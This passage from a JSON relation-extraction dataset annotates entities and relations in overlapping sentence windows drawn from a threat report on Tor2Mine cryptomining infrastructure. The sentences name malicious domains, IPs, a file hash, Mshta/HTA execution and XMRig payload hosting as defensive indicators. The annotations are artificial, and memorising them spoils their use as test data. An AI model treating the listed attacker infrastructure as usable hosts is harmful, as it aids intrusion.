"global_pos": [192, 192], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "17_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "ST", "evidence": [1, 2], "t": 1, "h": 5}, {"r": "RF", "evidence": [1, 2], "t": 1, "h": 5}, {"r": "ST", "evidence": [1, 2], "t": 2, "h": 5}, {"r": "RF", "evidence": [1, 2], "t": 2, "h": 5}, {"r": "ST", "evidence": [1, 2], "t": 3, "h": 5}, {"r": "RF", "evidence": [1, 2], "t": 3, "h": 5}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "ST", "evidence": [2, 3, 4, 5], "h": 5, "t": 12}, {"r": "RF", "evidence": [2, 3, 4, 5], "h": 5, "t": 12}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "h": 5, "t": 14}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "h": 5, "t": 14}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "h": 5, "t": 15}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "h": 5, "t": 15}, {"r": "CO", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}, {"r": "CO", "evidence": [4], "h": 9, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "CO", "evidence": [5, 6, 7], "h": 12, "t": 17}, {"r": "CO", "evidence": [6], "h": 15, "t": 16}]}, {"title": "087-7", "sents": [["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."], ["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."], ["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."], ["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."], ["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."], ["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [7, 7], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "nameservers", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "actors", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "Mshta", "pos": [15, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "HTA files", "pos": [18, 20], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [51, 51], "name": "domain", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [57, 57], "name": "107.181.187.132", "pos": [7, 8], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [92, 92], "name": "185.10.68.147", "pos": [6, 7], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [100, 100], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [102, 102], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [116, 116], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [130, 130], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [149, 149], "name": "107.181.160.197", "pos": [20, 21], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [155, 155], "name": "185.10.68.147", "pos": [26, 27], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [162, 162], "name": "185.10.68.147", "pos": [33, 34], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [181, 181], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [184, 184], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [0, 1], "t": 0, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 0, "h": 4}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "ST", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1, 2, 3, 4], "h": 4, "t": 11}, {"r": "RF", "evidence": [1, 2, 3, 4], "h": 4, "t": 11}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 13}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 13}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 14}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 14}, {"r": "ST", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 4, "t": 17}, {"r": "RF", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 4, "t": 17}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "CO", "evidence": [3], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "CO", "evidence": [4, 5, 6], "h": 11, "t": 16}, {"r": "CO", "evidence": [5], "h": 14, "t": 15}]}, {"title": "087-8", "sents": [["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."], ["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."], ["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."], ["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."], ["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."], ["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "actors", "pos": [13, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "Mshta", "pos": [15, 16], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "HTA files", "pos": [18, 20], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "domain", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "107.181.187.132", "pos": [7, 8], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [71, 71], "name": "185.10.68.147", "pos": [6, 7], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [79, 79], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [81, 81], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [95, 95], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [109, 109], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [128, 128], "name": "107.181.160.197", "pos": [20, 21], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [134, 134], "name": "185.10.68.147", "pos": [26, 27], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [141, 141], "name": "185.10.68.147", "pos": [33, 34], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [160, 160], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [163, 163], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [181, 181], "name": "domain", "pos": [5, 6], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [185, 185], "name": "URLs", "pos": [9, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [193, 193], "name": "Tor2Mine", "pos": [17, 18], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [202, 202], "name": ".hta", "pos": [26, 27], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [206, 206], "name": "checking.ps1", "pos": [30, 31], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0, 1, 2, 3], "h": 1, "t": 8}, {"r": "RF", "evidence": [0, 1, 2, 3], "h": 1, "t": 8}, {"r": "ST", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 10}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 10}, {"r": "ST", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 11}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 11}, {"r": "ST", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 1, "t": 14}, {"r": "RF", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 1, "t": 14}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2], "h": 5, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 13}, {"r": "CO", "evidence": [4], "h": 11, "t": 12}, {"r": "ST", "evidence": [4, 5, 6, 7], "t": 10, "h": 17}, {"r": "RF", "evidence": [4, 5, 6, 7], "t": 10, "h": 17}, {"r": "ST", "evidence": [4, 5, 6, 7], "t": 12, "h": 17}, {"r": "RF", "evidence": [4, 5, 6, 7], "t": 12, "h": 17}, {"r": "ST", "evidence": [5, 6, 7], "t": 13, "h": 17}, {"r": "RF", "evidence": [5, 6, 7], "t": 13, "h": 17}, {"r": "ST", "evidence": [6, 7], "t": 14, "h": 17}, {"r": "RF", "evidence": [6, 7], "t": 14, "h": 17}, {"r": "ST", "evidence": [7], "t": 16, "h": 17}, {"r": "RF", "evidence": [7], "t": 16, "h": 17}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}, {"r": "WR", "evidence": [7], "h": 17, "t": 19}, {"r": "CO", "evidence": [7], "h": 15, "t": 16}]}, {"title": "087-9", "sents": [["The", "domain", "is", "hosted", "on", "the", "same", "107.181.187.132", "IP", "address", "and", "was", "first", "seen", "in", "March", "2020", ",", "according", "to", "Umbrella", ",", "suggesting", "this", "is", "a", "relatively", "new", "component", "of", "the", "attacker", "'", "s", "infrastructure", "."], ["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."], ["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."], ["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."], ["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."], ["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "domain", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [7, 7], "name": "107.181.187.132", "pos": [7, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [42, 42], "name": "185.10.68.147", "pos": [6, 7], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [50, 50], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [66, 66], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [80, 80], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [99, 99], "name": "107.181.160.197", "pos": [20, 21], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [105, 105], "name": "185.10.68.147", "pos": [26, 27], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [112, 112], "name": "185.10.68.147", "pos": [33, 34], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [131, 131], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [134, 134], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [152, 152], "name": "domain", "pos": [5, 6], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [156, 156], "name": "URLs", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [164, 164], "name": "Tor2Mine", "pos": [17, 18], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [173, 173], "name": ".hta", "pos": [26, 27], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [177, 177], "name": "checking.ps1", "pos": [30, 31], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [192, 192], "name": "195.123.234.33", "pos": [12, 13], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [198, 198], "name": "payloads", "pos": [18, 19], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [201, 201], "name": "XMRig", "pos": [21, 22], "index": "19_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1], "h": 2, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 10}, {"r": "CO", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3, 4, 5, 6], "t": 7, "h": 14}, {"r": "RF", "evidence": [3, 4, 5, 6], "t": 7, "h": 14}, {"r": "ST", "evidence": [3, 4, 5, 6], "t": 9, "h": 14}, {"r": "RF", "evidence": [3, 4, 5, 6], "t": 9, "h": 14}, {"r": "ST", "evidence": [4, 5, 6], "t": 10, "h": 14}, {"r": "RF", "evidence": [4, 5, 6], "t": 10, "h": 14}, {"r": "ST", "evidence": [5, 6], "t": 11, "h": 14}, {"r": "RF", "evidence": [5, 6], "t": 11, "h": 14}, {"r": "ST", "evidence": [6], "t": 13, "h": 14}, {"r": "RF", "evidence": [6], "t": 13, "h": 14}, {"r": "WR", "evidence": [6], "h": 14, "t": 15}, {"r": "WR", "evidence": [6], "h": 14, "t": 16}, {"r": "CO", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 12, "t": 17}, {"r": "WR", "evidence": [7], "t": 18, "h": 19}]}, {"title": "087-10", "sents": [["We", "identified", "a", "new", "IP", ",", "185.10.68.147", ",", "hosting", "at", "least", "two", "domains", ",", "asq.r77vh0.pw", "and", "asq.d6shiiwz.pw", ",", "that", "we", "assess", "are", "part", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."], ["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."], ["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."], ["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."], ["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."], ["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [6, 6], "name": "185.10.68.147", "pos": [6, 7], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "asq.r77vh0.pw", "pos": [14, 15], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [16, 16], "name": "asq.d6shiiwz.pw", "pos": [16, 17], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [44, 44], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [63, 63], "name": "107.181.160.197", "pos": [20, 21], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [69, 69], "name": "185.10.68.147", "pos": [26, 27], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [76, 76], "name": "185.10.68.147", "pos": [33, 34], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [95, 95], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [98, 98], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [116, 116], "name": "domain", "pos": [5, 6], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [120, 120], "name": "URLs", "pos": [9, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "Tor2Mine", "pos": [17, 18], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [137, 137], "name": ".hta", "pos": [26, 27], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [141, 141], "name": "checking.ps1", "pos": [30, 31], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [156, 156], "name": "195.123.234.33", "pos": [12, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "payloads", "pos": [18, 19], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [165, 165], "name": "XMRig", "pos": [21, 22], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [175, 175], "name": "185.10.68.147", "pos": [8, 9], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 8}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2, 3, 4, 5], "t": 5, "h": 12}, {"r": "RF", "evidence": [2, 3, 4, 5], "t": 5, "h": 12}, {"r": "ST", "evidence": [2, 3, 4, 5], "t": 7, "h": 12}, {"r": "RF", "evidence": [2, 3, 4, 5], "t": 7, "h": 12}, {"r": "ST", "evidence": [3, 4, 5], "t": 8, "h": 12}, {"r": "RF", "evidence": [3, 4, 5], "t": 8, "h": 12}, {"r": "ST", "evidence": [4, 5], "t": 9, "h": 12}, {"r": "RF", "evidence": [4, 5], "t": 9, "h": 12}, {"r": "ST", "evidence": [5], "t": 11, "h": 12}, {"r": "RF", "evidence": [5], "t": 11, "h": 12}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5], "h": 12, "t": 14}, {"r": "CO", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 15}, {"r": "WR", "evidence": [6], "t": 16, "h": 17}]}, {"title": "087-11", "sents": [["The", "asq.r77vh0.pw", "domain", "is", "registered", "under", "the", "same", "two", "previously", "mentioned", "reg.ru", "providers", "."], ["The", "asq.r77vh0.pw", "domain", "also", "has", "at", "least", "one", "referring", "file", "(", "67f5f339c71c9c887dfece5cb6e2ab6", ")", "that", "reaches", "out", "to", "both", "the", "older", "107.181.160.197", "IP", "and", "the", "newly", "identified", "185.10.68.147", "IP", ",", "bolstering", "the", "notion", "that", "185.10.68.147", "is", "an", "extension", "of", "Tor2Mine", "'", "s", "infrastructure", "."], ["Cisco", "Umbrella", "showing", "a", "spike", "in", "DNS", "requests", "for", "asq.r77vh0.pw", "."], ["The", "asq.d6shiiwz.pw", "domain", "is", "also", "registered", "under", "the", "same", "two", "reg.ru", "hosting", "providers", "."], ["According", "to", "VirusTotal", ",", "this", "domain", "has", "hosted", "several", "URLs", "that", "are", "lexically", "similar", "to", "previously", "identified", "Tor2Mine", "URLs", ",", "such", "as", "those", "ending", "in", "``", ".hta", "''", "and", "``", "checking.ps1", "''", "."], ["Both", "domains", "were", "also", "previously", "hosted", "on", "the", "same", "IP", "address", ",", "195.123.234.33", ",", "which", "also", "hosts", "malicious", "payloads", "associated", "with", "XMRig", "."], ["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."], ["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [15, 15], "name": "asq.r77vh0.pw", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [34, 34], "name": "107.181.160.197", "pos": [20, 21], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "185.10.68.147", "pos": [26, 27], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [47, 47], "name": "185.10.68.147", "pos": [33, 34], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [66, 66], "name": "asq.r77vh0.pw", "pos": [9, 10], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [69, 69], "name": "asq.d6shiiwz.pw", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [87, 87], "name": "domain", "pos": [5, 6], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [91, 91], "name": "URLs", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "Tor2Mine", "pos": [17, 18], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": ".hta", "pos": [26, 27], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [112, 112], "name": "checking.ps1", "pos": [30, 31], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [127, 127], "name": "195.123.234.33", "pos": [12, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "payloads", "pos": [18, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [136, 136], "name": "XMRig", "pos": [21, 22], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [146, 146], "name": "185.10.68.147", "pos": [8, 9], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [170, 170], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [176, 176], "name": "XMRigCC", "pos": [10, 11], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [181, 181], "name": "XMRig", "pos": [15, 16], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "actors", "pos": [21, 22], "index": "19_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1, 2, 3, 4], "t": 2, "h": 9}, {"r": "RF", "evidence": [1, 2, 3, 4], "t": 2, "h": 9}, {"r": "ST", "evidence": [1, 2, 3, 4], "t": 4, "h": 9}, {"r": "RF", "evidence": [1, 2, 3, 4], "t": 4, "h": 9}, {"r": "ST", "evidence": [2, 3, 4], "t": 5, "h": 9}, {"r": "RF", "evidence": [2, 3, 4], "t": 5, "h": 9}, {"r": "ST", "evidence": [3, 4], "t": 6, "h": 9}, {"r": "RF", "evidence": [3, 4], "t": 6, "h": 9}, {"r": "ST", "evidence": [4], "t": 8, "h": 9}, {"r": "RF", "evidence": [4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 9, "t": 11}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 12}, {"r": "WR", "evidence": [5], "t": 13, "h": 14}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 16}, {"r": "ST", "evidence": [7], "t": 16, "h": 17}, {"r": 